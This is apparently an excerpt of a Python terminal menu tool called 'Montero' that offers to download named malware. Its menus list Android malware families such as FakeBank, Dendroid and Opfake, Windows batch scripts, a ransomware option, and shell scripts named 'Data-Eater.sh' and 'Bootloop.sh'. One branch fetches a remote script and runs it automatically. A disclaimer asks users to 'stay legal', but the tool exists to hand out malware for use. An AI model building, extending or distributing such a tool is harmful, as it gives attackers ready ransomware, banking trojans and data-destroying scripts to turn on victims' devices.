...
#--- Def menu ---#
def banner():
    os.system("toilet -f big ' LilNasX' -F gay | lolcat")   
    #print(""+B+"I "+R+┏┓░┏┓░░░░░░░░░░░┏━┓░░░"+R+"R") 
#print(""+B+"I "+R+┃┃░┣┫┏┓░┏━┳┓┏━┓░┃━┫┏┳┓"+R+"R") 
#print(""+B+"I "+R+┃┗┓┃┃┃┗┓┃┃┃┃┃╋┗┓┣━┃┣┃┫"+R+"R") 
#print(""+B+"I "+R+┗━┛┗┛┗━┛┗┻━┛┗━━┛┗━┛┗┻┛"+R+"R") 
def about():
	...
	print("\t"+G+"Named"+B+" after lil nas x"+R+" <3"+B+"\t\t")
	print("\tAuthor  : Versacefer \t\t\t")
	print("\tVersion : 1.0\t\t\t")
	print("\tTeam    : "+R+"The Otherside")
	print("\t"+B+"Thanks for Using This Tools")
	menu()
	
def banner2():
	os.system("toilet -f big ' Montero' -F gay | lolcat")
...
#################### START ANDROID
def Vandroid():
	print(""+O+"["+R+"1"+B+"] Agent\t\t["+R+"15"+O+"] Elite\t\t["+R+"29"+R+"] Prasesfee")
	print(""+O+"["+R+"2"+B+"] Badnews\t\t["+R+"16"+O+"] Omigo\t\t["+R+"30"+R+"] RecipeSmart")
	print(""+O+"["+R+"3"+B+"] Bios\t\t["+R+"17"+O+"] Opfake\t\t["+R+"31"+R+"] Romaticpos")
	print(""+O+"["+R+"4"+B+"] BlatanSMS\t\t["+R+"18"+O+"] SmsWorker\t\t["+R+"32"+R+"] Statetss")
	print(""+O+"["+R+"5"+B+"] BrainTest\t\t["+R+"19"+O+"] Vietcon\t\t["+R+"33"+R+"] Thinking")
	print(""+O+"["+R+"6"+B+"] Claco\t\t["+R+"20"+O+"] Candycorn\t\t["+R+"34"+R+"] Crd")
	print(""+O+"["+R+"7"+B+"] DropDialer\t\t["+R+"21"+O+"] Cat\t\t["+R+"35"+R+"] Dendroid")
	print(""+O+"["+R+"8"+B+"] FakeBank\t\t["+R+"22"+O+"] Chistescortos\t["+R+"36"+R+"] Ds")
	print(""+O+"["+R+"9"+B+"] FakeCMCC\t\t["+R+"23"+O+"] Chistespicanticos\t["+R+"37"+R+"] Facebook")
	print(""+O+"["+R+"10"+B+"] FakeDoc\t\t["+R+"24"+O+"] ComFunnys\t\t["+R+"38"+R+"] Fakeav")
	print(""+O+"["+R+"11"+B+"] FakeValidation\t["+R+"25"+O+"] ComImagePets\t["+R+"39"+R+"] ArtStation")
	print(""+O+"["+R+"12"+B+"] Fobus\t\t["+R+"26"+O+"] ComKitchen\t\t["+R+"40"+R+"] MusicPlayer")
	print(""+O+"["+R+"13"+B+"] GinMaster\t\t["+R+"27"+O+"] ComLaughtter\t["+R+"41"+R+"] Settings")
	print(""+O+"["+R+"14"+B+"] Masnu\t\t["+R+"28"+O+"] Prasesamor\t\t["+R+"42"+R+"] Back")
	
	try:
		menu1 = input("Input Number > "+C+"")
		if menu1 == 1:#############done
			print(""+G+"")
			chunk_size = 1024
...
###################Start PC
def vpcwin():
	print(""+O+"["+R+"1"+C+"] Ugly.bat\t\t["+R+"5"+O+"] Koce.bat\t\t["+R+"9"+R+"] Ransomeware")
	print(""+O+"["+R+"2"+R+"] Sleepy.bat\t\t["+R+"6"+B+"] Cmd.bat\t\t["+R+"10"+O+"] Rip.bat")
	print(""+O+"["+R+"3"+B+"] Reg-eater.bat\t["+R+"7"+C+"] Capslock.vbs\t["+R+"11"+B+"] Back")
	print(""+O+"["+R+"4"+R+"] Kuis.bat\t\t["+R+"8"+R+"] Alay.vbs")
...
###############Start Shell Virus		
def Shellvirus():
	print(""+O+"["+R+"1"+R+"] Data-Eater.sh")
	print(""+O+"["+R+"2"+B+"] Bootloop.sh")
	print(""+O+"["+R+"3"+O+"] Back")
...
def banner2():
	print(""+G+"Please dont "+R+" use this "+G+"Tool for any Illegal activity")
	print(""+R+"[!] "+G+"Stay Legal Dont Be Illegal By Versacefer"+R+" [!]"+O+"")
def menu():
	print("\n"+R+"[========== Menu ==========]"+O+"")
	...
	try:
		...
		if menu == 1:
			...
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'montero.py?raw=true' montero.py")
			os.system("python2 montero.py")
		elif menu == 8:
			os.system("clear")
			about()
		elif menu == 9:
		...
		print(""+R+"[!] This is not option number ")
